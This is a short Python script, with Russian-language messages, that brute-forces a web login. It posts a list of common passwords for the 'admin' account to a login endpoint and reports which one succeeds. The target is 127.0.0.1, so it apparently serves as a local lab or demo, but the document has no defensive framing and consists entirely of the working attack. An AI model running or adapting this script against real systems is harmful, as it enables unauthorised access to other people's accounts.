import requests


url = 'http://127.0.0.1:5000/login'
username = 'admin'
passwords = ['password1', 'password2', 'admin', 'guest', '123456', 'password']

for password in passwords:
    response = requests.post(url, data={'username': username, 'password': password})
    if 'Успешный вход!' in response.text:
        print(f'Найден рабочий пароль: {password}')
        break
    else:
        print(f'Пароль {password} не подошел')

# Если рабочий пароль найден
if response.status_code == 200 and 'Успешный вход!' in response.text:
    print('Brute Force атака успешна!')
else:
    print('Не удалось найти рабочий пароль.')
